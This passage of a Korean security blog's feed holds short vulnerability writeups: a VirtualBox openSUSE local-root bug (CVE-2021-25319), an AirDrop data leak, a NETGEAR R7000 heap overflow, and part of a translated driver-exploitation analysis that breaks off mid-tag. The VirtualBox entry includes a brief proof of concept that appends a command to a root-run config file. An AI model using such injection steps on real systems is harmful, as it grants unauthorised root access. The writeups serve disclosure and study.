    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q2/78">virtualbox: CVE-2021-25319: missing sticky bit in openSUSE packaging for /etc/box allows local root exploit for members of vboxusers group </a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>VirtualBox for openSUSE</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>oracle&#xC0AC;&#xC758; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xAC00;&#xC0C1; &#xBA38;&#xC2E0; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC778; VirtualBox openSUSE &#xD328;&#xD0A4;&#xC9C0; &#xBC30;&#xD3EC;&#xD310;&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xACC4;&#xC815; &#xADF8;&#xB8F9;&#xC758; &#xC720;&#xC800;&#xAC00; root&#xB85C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>vboxusers</code> group&#xC740; VirtualBox &#xC790;&#xB3D9;&#xC2DC;&#xC791;&#xC744; &#xC704;&#xD574; &#xB3C4;&#xC785;&#xB418;&#xC5C8;&#xC73C;&#xBA70; VirtualBox&#xC758; &#xC5EC;&#xB7EC; &#xAD6C;&#xC131; &#xD30C;&#xC77C;&#xC774; &#xD3EC;&#xD568;&#xB41C;  <code>/etc/vbox</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xC4F0;&#xAE30; &#xAD8C;&#xD55C;&#xC774; &#xBD80;&#xC5EC;&#xB41C; &#xC720;&#xC800; &#xADF8;&#xB8F9;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; <code>/etc/vbox</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; sticky bit &#xC124;&#xC815;&#xC774; &#xB204;&#xB77D;&#xB418;&#xC5B4; &#xC788;&#xC5B4; <code>vboxusers</code>&#xC5D0; &#xC18D;&#xD55C; &#xBAA8;&#xB4E0; &#xC720;&#xC800;&#xAC00; &#xD574;&#xB2F9; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xC784;&#xC758;&#xB85C; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>sticky bit&#xAC00; &#xC124;&#xC815;&#xB41C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0;&#xB294; &#xB204;&#xAD6C;&#xB098; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; &#xC0AD;&#xC81C; &#xBC0F; &#xC218;&#xC815;&#xC740; &#xC0DD;&#xC131;&#xD55C; &#xC720;&#xC800;&#xC640; root&#xB9CC; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p></blockquote><p>&#xC704; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xBA74;  <code>vboxautostart.sh</code>, <code>vboxdrv.sh</code>&#xBC0F; <code>vboxweb-service.sh</code>&#xC640; &#xAC19;&#xC774; root &#xAD8C;&#xD55C;&#xC758; VirtualBox bash script&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>/etc/vbox/vbox.cfg</code> &#xD30C;&#xC77C;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC5B4; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xD604;&#xC7AC; &#xC791;&#xC5C5; &#xB514;&#xB809;&#xD130;&#xB9AC;(CWD) &#xB0B4;&#xC758; &#xC81C;&#xD55C;&#xB41C; &#xBA85;&#xB839; &#xBC0F; &#xD30C;&#xC77C; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. PoC&#xB294; &#xC124;&#xBA85;&#xACFC; &#xD568;&#xAED8; &#xC544;&#xB798;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-comment">//vboxusers &#xADF8;&#xB8F9; nobody &#xC0DD;&#xC131;</span>root<span class="hljs-meta"># su -g vboxusers nobody</span>nobody$ cd /etc/vboxnobody$ cp vbox.cfg vbox.cfg.<span class="hljs-keyword">new</span><span class="hljs-comment">// nobody&#xC5D0;&#xC11C; &#xAE30;&#xC874; vbox.cfg &#xC0AD;&#xC81C;&#xD6C4; &#xC784;&#xC758; &#xBA85;&#xB839;&#xC774; &#xD3EC;&#xD568;&#xB41C; vbox.cfg&#xB85C; &#xB300;&#xCCB4;</span>nobody$ rm -f vbox.cfgnobody$ mv vbox.cfg.<span class="hljs-keyword">new</span> vbox.cfgnobody$ echo <span class="hljs-string">&quot;touch /root/evil&quot;</span> &gt;&gt;vbox.cfgnobody$ <span class="hljs-built_in">exit</span><span class="hljs-comment">// vboxautostart &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74; &#xD2B8;&#xB9AC;&#xAC70;</span>root<span class="hljs-meta"># systemctl start vboxautostart.service</span>root<span class="hljs-meta"># ls -lh /root/evil</span>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">0</span>  <span class="hljs-number">2.</span> M&#xE4;r <span class="hljs-number">12</span>:<span class="hljs-number">14</span> /root/evil</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>oracle</tag>
      
      <tag>virtualbox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 애플 AirDrop 사용자 개인 정보 유출 취약점</title>
    <link href="/2021/04/29/idioth/2021-04-29/"/>
    <url>/2021/04/29/idioth/2021-04-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://therecord.media/airdrop-bugs-expose-apple-users-email-addresses-phone-numbers/">AirDrop bugs expose Apple users&#x2019; email addresses, phone numbers</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>AirDrop &#xAE30;&#xB2A5;&#xC774; &#xCF1C;&#xC838; &#xC788;&#xB294; &#xC560;&#xD50C; &#xAE30;&#xAE30;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC560;&#xD50C;&#xC758; &#xD30C;&#xC77C; &#xC804;&#xC1A1; &#xAE30;&#xB2A5;&#xC778; AirDrop&#xC5D0;&#xC11C; &#xD574;&#xCEE4;&#xAC00; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xD578;&#xB4DC;&#xD3F0; &#xBC88;&#xD638;, &#xC774;&#xBA54;&#xC77C; &#xC8FC;&#xC18C; &#xB4F1;&#xC758; &#xAC1C;&#xC778; &#xC815;&#xBCF4;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xB294; &#xB450; &#xAC00;&#xC9C0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xB450; &#xAC00;&#xC9C0; &#xBC84;&#xADF8;&#xB294; &#xC11C;&#xB85C;&#xB97C; &#xAC80;&#xC0C9;&#xD558;&#xACE0; &#xC54C;&#xACE0; &#xC788;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; AirDrop &#xC5F0;&#xACB0; &#xCD08;&#xBC18; &#xC778;&#xC99D; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC560;&#xD50C; &#xAE30;&#xAE30;&#xB294; &#xAE30;&#xAE30; &#xC2A4;&#xD399;&#xACFC; &#xD578;&#xB4DC;&#xD3F0; &#xBC88;&#xD638;, Apple ID, &#xC774;&#xBA54;&#xC77C; &#xC8FC;&#xC18C; &#xB4F1;&#xC744; &#xD3EC;&#xD568;&#xD55C; &#xAC1C;&#xC778; &#xB370;&#xC774;&#xD130;&#xC640; &#xAC19;&#xC740; &#xAE30;&#xAE30;&#xC640; &#xC18C;&#xC720;&#xC790;&#xC5D0; &#xAD00;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xD3EC;&#xD568;&#xD55C; AWDL(Apple Wireless Direct Link) &#xD328;&#xD0B7;&#xC744; &#xAD50;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB4E4;&#xC774; intercept &#xB418;&#xB294; &#xAC83;&#xC744; &#xB9C9;&#xAE30; &#xC704;&#xD574; Apple&#xC740; SHA256 &#xD574;&#xC26C; &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF4;&#xD638;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; AirDrop&#xC774; &#xCF1C;&#xC838;&#xC788;&#xB294; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xAE30;&#xAE30;&#xB294; discovery packet&#xC744; &#xBAA8;&#xB4E0; &#xBC29;&#xD5A5;&#xC73C;&#xB85C; &#xD56D;&#xC0C1; &#xBE0C;&#xB85C;&#xB4DC; &#xCE90;&#xC2A4;&#xD2B8; &#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xC640; &#xBB3C;&#xB9AC;&#xC801;&#xC73C;&#xB85C; &#xAC00;&#xAE4C;&#xC6B4;(&#xBE14;&#xB8E8;&#xD22C;&#xC2A4; &#xAC70;&#xB9AC;) &#xC0AC;&#xC6A9;&#xC790;&#xB294; WiFi &#xCE74;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xBA54;&#xC2DC;&#xC9C0;&#xB4E4;&#xC744; intercept &#xD558;&#xC5EC; &#xD574;&#xC26C;&#xB41C; &#xB370;&#xC774;&#xD130;&#xC758; &#xC77C;&#xBD80;&#xB97C; &#xBCF5;&#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC560;&#xD50C;&#xC740; 2019&#xB144; 5&#xC6D4;&#xBD80;&#xD130; <a href="https://www.zdnet.com/article/apples-awdl-protocol-plagued-by-flaws-that-enable-tracking-and-mitm-attacks/">&#xC774;&#xB7EC;&#xD55C; &#xC774;&#xC288;</a>&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C;&#xACE0; &#xC788;&#xC5C8;&#xC73C;&#xBA70; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC740; Research &#xD300;&#xC5D0;&#xC11C; &#xC0C8;&#xB85C;&#xC6B4; PrivateDrop protocol &#xC0AC;&#xC6A9;&#xC744; &#xC81C;&#xC548;&#xD558;&#xC600;&#xC73C;&#xB098; &#xC544;&#xC9C1; &#xC560;&#xD50C;&#xC5D0;&#xAC8C; &#xB2F5;&#xBCC0;&#xC744; &#xBC1B;&#xC9C0; &#xBABB;&#xD588;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>apple</tag>
      
      <tag>idioth</tag>
      
      <tag>airdrop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-31802: NETGEAR Nightawk R7000 RCE</title>
    <link href="/2021/04/28/fabu1ous/2021-04-28/"/>
    <url>/2021/04/28/fabu1ous/2021-04-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r7000-httpd-preauth-rce/">NETGEAR Nightawk R7000 PreAuth RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Netgear Nighthawk R7000 firmware &lt;= 1.0.11.116</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>NETGEAR R7000 &#xB77C;&#xC6B0;&#xD130;&#xC5D0;&#xC11C; &#xC778;&#xC99D; &#xC808;&#xCC28;&#xB97C; &#xBB34;&#xC2DC;&#xD558;&#xACE0; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; HTTP &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; user supplied data&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D; &#xBBF8;&#xD761;&#xC73C;&#xB85C; &#xBC1C;&#xC0DD;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xD574;&#xCEE4;&#xB294; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C;&#xC758; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC720;&#xC800;&#xB294; Httpd&#xC758;  <code>/backup.cgi</code> URL&#xC744; &#xD1B5;&#xD574;  &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB450; &#xAC1C;&#xC758; &#xBCC0;&#xC218;&#xB85C; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xD45C;&#xD604;&#xD558;&#xB294;&#xB370;  &#xADF8;&#xC911; &#xD558;&#xB098;&#xB294; HTTP POST Request Header&#xC758; <code>Content-length</code> &#xAC12;&#xC744;, &#xB2E4;&#xB978; &#xD558;&#xB098;&#xB294; HTTP POST Request Body&#xC758; <code>Content-length</code> &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; <code>malloc</code>&#xC744; &#xD638;&#xCD9C;&#xD574; &#xD30C;&#xC77C;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD55C;  <code>Content-length+600</code> &#xD06C;&#xAE30;&#xC758; &#xCCAD;&#xD06C;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. HTTP POST Request Header&#xC758; <code>Content-length</code>&#xB294; &#xC720;&#xC800;&#xAC00; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xB294; &#xB370;&#xC774;&#xD130;&#xC774;&#xBBC0;&#xB85C; &#xC784;&#xC758; &#xD06C;&#xAE30;&#xC758; chunk&#xB97C; &#xD560;&#xB2F9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4;  <code>memcpy</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD560;&#xB2F9;&#xB41C; &#xCCAD;&#xD06C;&#xC5D0; &#xD30C;&#xC77C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC62E;&#xAE30;&#xB294;&#xB370; HTTP POST Request Body&#xC758; <code>Content-length</code> &#xD06C;&#xAE30;&#xB9CC;&#xD07C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; HTTP POST Request Body&#xC758; <code>Content-length</code>&#xB294; &#xC720;&#xC800; &#xC81C;&#xC5B4;&#xAC00; &#xAC00;&#xB2A5;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB85C; heap overflow&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>heap overflow</tag>
      
      <tag>firmware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Exploiting System Mechanic Driver Part 2</title>
    <link href="/2021/04/28/l0ch/exploiting-driver-part2/"/>
    <url>/2021/04/28/l0ch/exploiting-driver-part2/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Part 1 &#xBCF4;&#xB7EC;&#xAC00;&#xAE30; : <a href="https://hackyboiz.github.io/2021/04/21/l0ch/exploiting-driver/">Exploiting System Mechanic Driver Part 1</a></p><p>&#xC6D0;&#xBB38; &#xAE00; : <a href="https://labs.yarix.com/2021/04/exploiting-system-mechanic-driver/">Exploiting System Mechanic Driver</a></p></blockquote><h1 id="Root-Cause-Analysis"><a href="#Root-Cause-Analysis" class="headerlink" title="Root Cause Analysis"></a>Root Cause Analysis</h1><h2 id="Analyzing-SUB-2C580-Dispatch-Routine"><a href="#Analyzing-SUB-2C580-Dispatch-Routine" class="headerlink" title="Analyzing SUB_2C580 (Dispatch Routine)"></a>Analyzing SUB_2C580 (Dispatch Routine)</h2><p><code>DeviceIoControl</code> API&#xAC00; &#xC7A5;&#xCE58;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB420; &#xB54C;&#xC758; &#xB514;&#xC2A4;&#xD328;&#xCE58; &#xB8E8;&#xD2F4;&#xC740; <code>SUB_2C580</code> &#xD568;&#xC218;&#xC774;&#xB2E4;. IDA Pro&#xC758; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC774; &#xD568;&#xC218;&#xAC00; 2&#xAC1C;&#xC758; &#xC778;&#xC218;&#xB97C; &#xBC1B;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB2E4;. </p><ol><li><code>DeviceObject</code>&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130; - <code>a1</code></li><li>&#xC7A5;&#xCE58;&#xC5D0; &#xC804;&#xB2EC; &#xB41C; IRP &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130; - <code>a2</code></li></ol><p>&#xD568;&#xC218;&#xB294; <code>DeviceIoControl</code>&#xC774; &#xBCF4;&#xB0B8; IRP &#xD3EC;&#xC778;&#xD130;&#xC5D0;&#xC11C; &#xBA54;&#xBAA8;&#xB9AC; &#xBC84;&#xD37C;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xCCB4;&#xC778;  <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_stack_location">_IO_STACK_LOCATION</a>&#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xACE0; &#xC9C0;&#xC5ED; &#xBCC0;&#xC218; v5&#xC5D0; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;.</p><p><img src="/2021/04/28/l0ch/exploiting-driver-part2/Untitled.png" alt="exploiting-driver-part2/Untitled.png"></p><p>&#xBC84;&#xD37C;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; IOCTL(<code>Parameters.Read.ByteOffset.LowPart</code> &#xBA64;&#xBC84;)&#xACFC; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xCF54;&#xB4DC;&#xC758; &#xD558;&#xB4DC; &#xCF54;&#xB529;&#xB41C; &#xAC12;(<code>2252803</code> decimal, <code>0x226003</code> hex)&#xC744; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2021/04/28/l0ch/exploiting-driver-part2/Untitled%201.png" alt="exploiting-driver-part2/Untitled%201.png"></p><p>&#xBE44;&#xAD50; &#xD6C4; &#xAC19;&#xC73C;&#xBA74; IOCTL &#xCF54;&#xB4DC; <code>0x226003</code>&#xC640; &#xAD00;&#xB828;&#xB41C; &#xD568;&#xC218;&#xC778; <code>SUB_166D0</code> &#xB97C; &#xD638;&#xCD9C;&#xD55C;&#xB2E4;. <code>SUB_166D0</code>&#xD568;&#xC218;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC804; &#xD568;&#xC218;&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xC138; &#xAC00;&#xC9C0; &#xC778;&#xC218; <code>v3</code>, <code>v7</code> &#xBC0F; <code>v4</code>&#xC5D0; &#xB300;&#xD574; &#xC124;&#xBA85;&#xD574;&#xC57C; &#xD55C;&#xB2E4;.</p><ul><li><code>v3</code> : <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iois32bitprocess">IoIs32BitProcess</a> &#xD568;&#xC218;&#xC758; &#xBC18;&#xD658; &#xAC12;&#xC774;&#xBA70; &#xD638;&#xCD9C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; 32&#xBE44;&#xD2B8;(TRUE)&#xC778;&#xC9C0; 64&#xBE44;&#xD2B8;(FALSE)&#xC778;&#xC9C0; &#xC54C;&#xB824;&#xC900;&#xB2E4;.</li><li><code>v7</code> : &#xC2E4;&#xC81C; &#xC720;&#xC800; &#xBC84;&#xD37C;&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;&#xC774;&#xBA70;, &#xC774; &#xACBD;&#xC6B0; user-space&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xB9AC;&#xD0A8;&#xB2E4;. &#xC774; &#xC8FC;&#xC18C;&#xB294; <code>DeviceIoControl</code> API&#xC5D0; &#xC778;&#xC218;&#xB85C; &#xC804;&#xB2EC;&#xB41C; &#xC8FC;&#xC18C;&#xC774;&#xB2E4;.</li><li><code>v4</code> : &#xBC84;&#xD37C;&#xC758; &#xD06C;&#xAE30;</li></ul><h2 id="Analyzing-SUB-166D0"><a href="#Analyzing-SUB-166D0" class="headerlink" title="Analyzing SUB_166D0"></a>Analyzing SUB_166D0</h2><p>&#xC774; &#xD568;&#xC218;&#xB294; &#xC774;&#xC804; &#xD568;&#xC218;&#xB4E4;&#xBCF4;&#xB2E4; &#xBCF5;&#xC7A1;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB2E4;&#xC591;&#xD55C; &#xBC18;&#xD658; &#xAC12;&#xC744; &#xBD84;&#xC11D;&#xD574; &#xCF54;&#xB4DC; &#xD750;&#xB984;&#xACFC; &#xC81C;&#xC57D; &#xC870;&#xAC74;&#xC744; &#xC774;&#xD574;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD588;&#xB2E4;. &#xAC01;&#xAC01; &#xC0C1;&#xD0DC; &#xCF54;&#xB4DC;&#xAC00; &#xC788;&#xB294; 5&#xAC1C;&#xC758; return &#xBB38;&#xC774; &#xC788;&#xB2E4;. &#xC774;&#xB97C; 16&#xC9C4;&#xC218;&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xACE0; &#xB098;&#xC5F4;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><ol><li><code>return 0xC0000023 == STATUS_BUFFER_TOO_SMALL</code></li><li><code>return 0xC0000023 == STATUS_BUFFER_TOO_SMALL</code></li><li><code>return 0xC0000001 == STATUS_UNSUCCESSFUL</code></li><li><code>return 0xC000000D == STATUS_INVALID_PARAMETER</code></li><li><code>return 0x0 == STATUS_SUCCESS</code></li></ol><p>&#xAC01;&#xAC01; MSDN&#xC5D0;&#xC11C; &#xCC3E;&#xC544;&#xBCF4;&#xACE0; &#xADF8; &#xC758;&#xBBF8;&#xB97C; &#xAE30;&#xB85D;&#xD574; &#xAC01; &#xC0C1;&#xD0DC; &#xCF54;&#xB4DC;&#xAC00; &#xBB34;&#xC5C7;&#xC744; &#xC758;&#xBBF8;&#xD558;&#xB294;&#xC9C0; &#xC54C;&#xC558;&#xC73C;&#xBBC0;&#xB85C; &#xAC01; &#xCF54;&#xB4DC; &#xBE14;&#xB85D;&#xC774; &#xBB34;&#xC5C7;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xCD94;&#xCE21;&#xD560; &#xC218; &#xC788;&#xB2E4;. </p><p>&#xCCAB; &#xBC88;&#xC9F8; <code>STATUS_BUFFER_TOO_SMALL</code> : &#xC55E;&#xC11C; &#xB9D0;&#xD588;&#xB4EF;&#xC774; <code>a1</code>&#xC740; &#xD638;&#xCD9C;&#xC790;&#xAC00; &#xD568;&#xC218;&#xC5D0; &#xC804;&#xB2EC;&#xD55C; &#xCCAB; &#xBC88;&#xC9F8; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xC774;&#xBA70; <code>IoIs32BitProcess</code>&#xC758; &#xBC18;&#xD658; &#xAC12;&#xC774;&#xACE0; <code>a3</code>&#xC740; &#xBC84;&#xD37C; &#xD06C;&#xAE30;&#xC774;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD638;&#xCD9C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; 32&#xBE44;&#xD2B8;&#xC778; &#xACBD;&#xC6B0; &#xBC84;&#xD37C; &#xD06C;&#xAE30;&#xB294; <code>0xC</code> &#xC774;&#xC0C1;&#xC774;&#xC5B4;&#xC57C; &#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2021/04/28/l0ch/exploiting-driver-part2/Untitled%202.png" alt="exploiting-driver-part2/Untitled%202.png"></p><p>64&#xBE44;&#xD2B8; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC778; &#xACBD;&#xC6B0; <code>0x18</code> &#xC774;&#xC0C1;&#xC774;&#xC5B4;&#xC57C; &#xD55C;&#xB2E4;. &#xB450; &#xACBD;&#xC6B0; &#xBAA8;&#xB450; &#xBC84;&#xD37C; &#xD06C;&#xAE30; &#xAC80;&#xC0AC;&#xB97C; &#xD1B5;&#xACFC;&#xD558;&#xBA74; <code>LABEL_6</code>&#xC73C;&#xB85C; &#xC774;&#xB3D9;&#xD55C;&#xB2E4;. 64&#xBE44;&#xD2B8;&#xC758; &#xACBD;&#xC6B0; &#xC785;&#xB825; &#xAD6C;&#xC870;&#xCCB4;&#xB97C; 8bytes &#xAE38;&#xC774;&#xC758; 3&#xAC1C;&#xB85C; &#xB098;&#xB204;&#xC5B4; &#xB354; &#xB9CE;&#xC740; &#xB85C;&#xCEEC; &#xBCC0;&#xC218;&#xAC00; &#xC0DD;&#xC131;&#xB41C;&#xB2E4;.</p><p><img src="/2021/04/28/l0ch/exploiting-driver-part2/Untitled%203.png" alt="exploiting-driver-part2/Untitled%203.png"></p><pre><code class="hljs cpp">v8 = *(_QWORD *)a2;v9 = *((_QWORD *)a2 + <span class="hljs-number">1</span>);v10 = *((_QWORD *)a2 + <span class="hljs-number">2</span>);</code></pre><p>&#xC704;&#xC5D0;&#xC11C; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xC785;&#xB825; &#xBC84;&#xD37C;&#xAC00; 3&#xAC1C;&#xC758; &#xC11C;&#xB85C; &#xB2E4;&#xB978; 8bytes &#xD544;&#xB4DC;&#xB85C; &#xAD6C;&#xC131;&#xB41C; &#xC77C;&#xC885;&#xC758; 24bytes &#xAE38;&#xC774; &#xAD6C;&#xC870;&#xCCB4;&#xC77C; &#xAC83;&#xC73C;&#xB85C; &#xCD94;&#xCE21;&#xD588;&#xB2E4;. <code>v8</code>, <code>v9</code> &#xBC0F; <code>v10</code>&#xC774; &#xC99D;&#xAC00; &#xC624;&#xD504;&#xC14B;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xC785;&#xB825; &#xBC84;&#xD37C; &#xC8FC;&#xC18C;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xD558;&#xACE0; &#xD574;&#xB2F9; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC5ED;&#xCC38;&#xC870;&#xD574; &#xC0C1;&#xB300; &#xAC12;&#xC744; &#xAC80;&#xC0C9;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2021/04/28/l0ch/exploiting-driver-part2/Untitled%204.png" 